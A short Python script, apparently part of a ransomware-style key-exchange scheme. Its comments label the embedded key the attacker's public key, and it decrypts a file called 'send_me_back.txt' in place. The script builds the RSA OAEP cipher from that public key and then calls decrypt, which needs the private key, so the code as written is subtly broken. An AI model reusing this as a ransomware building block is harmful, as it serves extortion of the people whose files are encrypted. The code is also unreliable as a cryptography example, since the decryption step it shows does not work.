import base64
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA

pubkey = "INSERT PUBLIC KEY HERE"  # Attacker's public key is inserted here.
decoded_pubkey = base64.b64decode(pubkey)  # Public key is decoded before imported.
imp_key = RSA.import_key(decoded_pubkey)  # Public key is imported.
cipher = PKCS1_OAEP.new(imp_key)  # The cipher in which the public key is used is defined.

with open('send_me_back.txt', 'rb') as f:
    encrypted_file = f.read()  # Encrypted file is read.

with open('send_me_back.txt', 'wb') as f:
    f.write(cipher.decrypt(encrypted_file))  # Decrypted and data written back.
